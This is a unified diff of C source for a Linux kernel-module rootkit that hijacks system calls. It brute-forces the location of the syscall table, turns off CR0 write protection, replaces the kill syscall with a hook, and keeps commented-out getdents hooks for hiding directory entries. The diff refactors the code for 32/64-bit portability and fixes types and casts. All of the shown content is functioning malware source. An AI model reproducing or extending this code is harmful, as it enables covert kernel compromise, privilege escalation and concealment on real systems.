@@ -31,9 +31,15 @@ MODULE_LICENSE("GPL");
 #define GPF_ENABLE write_cr0(read_cr0() | 0x10000)      //read somewhere it's terrible practice
 
 #ifdef __i386__
+typedef unsigned int address; //allows for easier 32/64bit builds
+#else
+typedef unsigned long long int address;
+#endif
+
+/*#ifdef __i386__
 unsigned int *syscall_table; 
 
-unsigned int **find() { //finds the syscall table, not exported as of 2.6 (32bit)
+unsigned int **find(void) { //finds the syscall table, not exported as of 2.6 (32bit)
     unsigned int **sctable;
     unsigned int i = START_MEM;
     while ( i < END_MEM) { //essentially brute force
@@ -48,7 +54,7 @@ unsigned int **find() { //finds the syscall table, not exported as of 2.6 (32bit
 #else
 unsigned long long *syscall_table;
  
-unsigned long long  **find() { //same as above but 64bit
+unsigned long long  **find(void) { //same as above but 64bit
 	unsigned long long **sctable;
 	unsigned long long int i = START_MEM;
 	while ( i < END_MEM) { //essentially brute force
@@ -60,7 +66,21 @@ unsigned long long  **find() { //same as above but 64bit
 	}
 	return NULL;
 }
-#endif
+#endif*/
+address *syscall_table;
+address **find(void) {
+    address **sctable;
+    address i = START_MEM;
+    while ( i < END_MEM ) {
+        sctable = (address **)i;
+        if ( sctable[__NR_close] == (address *) sys_close) {
+            return &sctable[0];
+        }
+        i += sizeof(void *);
+    }
+    return NULL;
+}
+    
 asmlinkage int (*original_kill)(pid_t pid, int sig);
 /*
 [lkm@lkm ~]$ id
@@ -105,7 +125,7 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 
 asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
     struct linux_dirent {
-        long           d_ino;
+        ino_t          d_ino;
         off_t          d_off;
         unsigned short d_reclen;
         char           d_name[];
@@ -143,7 +163,7 @@ static int init(void) { //initial function, sets up syscall hijacking
     //original_getdents64 = (void *)syscall_table[__NR_getdents64];
     GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
     //syscall_table[__NR_getdents] = new_getdents;
-    syscall_table[__NR_kill] = new_kill;
+    syscall_table[__NR_kill] = (address)new_kill;
     //syscall_table[__NR_getdents64] = new_getdents64;
     GPF_ENABLE;
 	return 0;
@@ -151,7 +171,7 @@ static int init(void) { //initial function, sets up syscall hijacking
 
 void cleanup_module(void) {
     GPF_DISABLE;
-    syscall_table[__NR_kill] = original_kill; //corrects the hijacking on unload
+    syscall_table[__NR_kill] = (address)original_kill; //corrects the hijacking on unload
     //syscall_table[__NR_getdents] = original_getdents;
     //syscall_table[__NR_getdents64] = original_getdents64;
     GPF_ENABLE;
